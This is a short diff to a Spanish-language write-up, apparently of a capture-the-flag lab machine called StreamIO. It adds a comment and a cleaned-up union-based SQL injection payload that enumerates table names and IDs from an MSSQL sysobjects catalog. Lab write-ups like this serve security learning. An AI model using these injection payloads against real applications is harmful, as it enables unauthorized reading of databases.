@@ -191,6 +191,7 @@ de esta manera usando la query hemos logrado enumerar el nombre de las tablas en
 ```python 
 10' union select 1,name,3,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- -
 ------------------------------------------------------------------------------------------------------------------------------
-10' union select 1,name,id,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- - sadasdasdas
+`utilizando el campo numero 3 podemos preguntar por el ID de la tablas para poder localizar el identificador especifico`
+10' union select 1,name,id,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- - 
 ```
 ![[Pasted image 20240514145530.png]]
